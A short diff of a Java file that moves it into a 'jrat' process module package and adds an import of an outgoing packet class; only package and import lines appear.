@@ -1,5 +1,6 @@
-package jrat.client.packets.outgoing;
+package jrat.module.process;
 
+import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import jrat.common.ProcessData;
 import jrat.common.io.StringWriter;
 import java.io.ByteArrayOutputStream;
